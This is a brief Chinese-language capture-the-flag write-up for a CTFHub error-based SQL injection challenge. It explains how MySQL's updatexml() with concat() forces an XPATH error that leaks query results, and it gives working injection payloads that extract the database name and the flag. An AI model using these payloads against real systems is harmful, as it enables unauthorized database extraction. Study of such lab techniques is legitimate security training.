# CTFHUB_报错注入

## 题目内容

![image-20210822203038754](/home/adian/note/Study_Note/网络安全/CTF/pic/16.png)

## WriteUp
此题只会返回查询正确或错误

使用updatexml


>首先了解下updatexml()函数
>
>UPDATEXML (XML_document, XPath_string, new_value);
>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
>第三个参数：new_value，String格式，替换查找到的符合条件的数据
>作用：改变文档中符合条件的节点的值
>改变XML_document中符合XPATH_string的值而我们的注入语句为：
>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
>1
>ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'


```
1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

查询到结果为sqli

为了方便，不做information_schema的查询了，直接查询flag

```
1 and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)
```

得到flag
